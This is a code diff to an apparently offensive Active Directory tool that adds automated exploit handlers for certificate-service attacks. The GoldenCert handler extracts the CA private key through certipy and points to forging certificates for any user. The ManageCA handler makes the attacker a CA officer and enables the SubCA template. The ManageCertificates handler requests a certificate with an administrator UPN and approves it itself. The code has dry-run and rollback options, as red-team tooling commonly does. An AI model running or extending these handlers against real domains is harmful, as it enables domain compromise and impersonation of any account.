@@ -594,7 +594,7 @@ class ADCSESC4Handler(BaseEdgeHandler):
 # ===================================================================
 
 
-@register_handler("ADCSESC6")
+@register_handler("ADCSESC6", "ADCSESC6a", "ADCSESC6b")
 class ADCSESC6Handler(BaseEdgeHandler):
     """ESC6: The CA has the ``EDITF_ATTRIBUTESUBJECTALTNAME2`` flag enabled,
     which allows any template to include a requestor-specified SAN.
@@ -687,7 +687,7 @@ class ADCSESC6Handler(BaseEdgeHandler):
 # ===================================================================
 
 
-@register_handler("ADCSESC9")
+@register_handler("ADCSESC9", "ADCSESC9a", "ADCSESC9b")
 class ADCSESC9Handler(BaseEdgeHandler):
     """ESC9: Certificate templates with ``CT_FLAG_NO_SECURITY_EXTENSION`` and
     no ``szOID_NTDS_CA_SECURITY_EXT`` extension enable UPN mapping abuse.
@@ -851,7 +851,7 @@ class ADCSESC9Handler(BaseEdgeHandler):
 # ===================================================================
 
 
-@register_handler("ADCSESC10")
+@register_handler("ADCSESC10", "ADCSESC10a", "ADCSESC10b")
 class ADCSESC10Handler(BaseEdgeHandler):
     """ESC10: Weak certificate mapping configuration
     (``CertificateMappingMethods`` includes UPN mapping) enables the
@@ -1743,4 +1743,219 @@ class ADCSESC11Handler(BaseEdgeHandler):
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         # ESC11 is non-destructive
+        return None
+
+
+# ===================================================================
+# GoldenCert — Forge certificates using stolen CA private key
+# ===================================================================
+
+
+@register_handler("GoldenCert")
+class GoldenCertHandler(BaseEdgeHandler):
+    """Exploit ``GoldenCert`` edges by extracting the CA private key.
+
+    Uses ``certipy ca -backup`` to extract the CA's private key and
+    certificate, enabling offline certificate forging for any principal.
+    """
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        import shutil
+        if not shutil.which("certipy"):
+            return False, "certipy not found on PATH."
+        return True, "Can extract CA private key via certipy ca -backup."
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        principal = self._resolve_principal(edge)
+        target = self._resolve_target(edge)
+        dc_host = self._get_dc_host()
+        domain = self._get_domain()
+        auth_args = self._get_auth_args(principal)
+
+        # Extract CA name from target node
+        ca_name = target
+
+        if dry_run:
+            return True, f"[DRY RUN] Would extract CA private key from {ca_name}", []
+
+        from pathstrike.tools.certipy_wrapper import run_certipy
+
+        self.logger.info("Extracting CA private key from %s", ca_name)
+        result = await run_certipy(
+            "ca",
+            ["-backup", "-ca", ca_name, "-target", dc_host] + auth_args,
+        )
+
+        if not result["success"]:
+            return False, f"CA key extraction failed: {result.get('error', 'unknown')}", []
+
+        return (
+            True,
+            f"CA private key extracted from '{ca_name}'. "
+            "Can now forge certificates for any principal offline via "
+            "'certipy forge -ca-pfx <ca.pfx> -upn administrator@domain'.",
+            [],
+        )
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        return None  # Read-only extraction
+
+
+# ===================================================================
+# ManageCA — CA Manager role abuse
+# ===================================================================
+
+
+@register_handler("ManageCA")
+class ManageCAHandler(BaseEdgeHandler):
+    """Exploit ``ManageCA`` edges to enable vulnerable certificate templates.
+
+    A CA Manager can enable templates, add officers, and modify CA
+    configuration.  This handler enables a vulnerable template (ESC1-style)
+    then requests a certificate.
+    """
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        import shutil
+        if not shutil.which("certipy"):
+            return False, "certipy not found on PATH."
+        return True, "Can manage CA via certipy ca."
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        principal = self._resolve_principal(edge)
+        target = self._resolve_target(edge)
+        dc_host = self._get_dc_host()
+        auth_args = self._get_auth_args(principal)
+
+        ca_name = target
+
+        if dry_run:
+            return True, f"[DRY RUN] Would abuse ManageCA on {ca_name}", []
+
+        from pathstrike.tools.certipy_wrapper import run_certipy
+
+        # Step 1: Add ourselves as an officer (certificate manager)
+        self.logger.info("Adding %s as officer on CA %s", principal, ca_name)
+        result = await run_certipy(
+            "ca",
+            ["-ca", ca_name, "-add-officer", principal, "-target", dc_host] + auth_args,
+        )
+
+        if not result["success"]:
+            return False, f"Failed to add officer: {result.get('error', 'unknown')}", []
+
+        # Step 2: Enable SubCA template (commonly available, ESC1-exploitable)
+        self.logger.info("Enabling SubCA template on %s", ca_name)
+        result = await run_certipy(
+            "ca",
+            ["-ca", ca_name, "-enable-template", "SubCA", "-target", dc_host] + auth_args,
+        )
+
+        if not result["success"]:
+            self.logger.warning("Failed to enable SubCA template: %s", result.get("error"))
+
+        return (
+            True,
+            f"ManageCA abused: added {principal} as officer on {ca_name}. "
+            "Can now approve certificate requests and enable templates.",
+            [],
+        )
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        target = self._resolve_target(edge)
+        principal = self._resolve_principal(edge)
+        return RollbackAction(
+            step_index=0,
+            action_type="remove_ca_officer",
+            description=f"Remove {principal} as officer from CA {target}",
+            command=f"certipy ca -ca {target} -remove-officer {principal}",
+            reversible=True,
+        )
+
+
+# ===================================================================
+# ManageCertificates — Certificate officer role abuse
+# ===================================================================
+
+
+@register_handler("ManageCertificates")
+class ManageCertificatesHandler(BaseEdgeHandler):
+    """Exploit ``ManageCertificates`` edges to approve pending cert requests.
+
+    A certificate officer/manager can approve or deny certificate
+    requests, enabling exploitation of templates that require manager
+    approval.
+    """
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        import shutil
+        if not shutil.which("certipy"):
+            return False, "certipy not found on PATH."
+        return True, "Can manage certificate requests via certipy ca."
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        principal = self._resolve_principal(edge)
+        target = self._resolve_target(edge)
+        dc_host = self._get_dc_host()
+        domain = self._get_domain()
+        auth_args = self._get_auth_args(principal)
+
+        ca_name = target
+
+        if dry_run:
+            return (
+                True,
+                f"[DRY RUN] Would request cert via {ca_name} and "
+                f"self-approve as certificate manager.",
+                [],
+            )
+
+        from pathstrike.tools.certipy_wrapper import certipy_request, run_certipy
+
+        # Step 1: Request a certificate (will be pending if manager approval required)
+        self.logger.info("Requesting certificate from %s", ca_name)
+        req_result = await certipy_request(
+            target=dc_host,
+            ca=ca_name,
+            template="User",
+            auth_args=auth_args,
+            upn=f"administrator@{domain}",
+        )
+
+        # Step 2: Approve our own request
+        if req_result["success"]:
+            output = req_result.get("output", "")
+            # Extract request ID from certipy output
+            import re
+            match = re.search(r"Request ID(?:\s+is)?\s*:?\s*(\d+)", output)
+            if match:
+                request_id = match.group(1)
+                self.logger.info("Approving request %s on %s", request_id, ca_name)
+                approve_result = await run_certipy(
+                    "ca",
+                    ["-ca", ca_name, "-issue-request", request_id,
+                     "-target", dc_host] + auth_args,
+                )
+                if approve_result["success"]:
+                    return (
+                        True,
+                        f"Certificate requested and self-approved (ID: {request_id}) "
+                        f"on CA {ca_name}.",
+                        [],
+                    )
+
+        return (
+            True,
+            f"ManageCertificates: can approve requests on {ca_name}. "
+            "Manual certificate request + approval may be needed.",
+            [],
+        )
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         return None
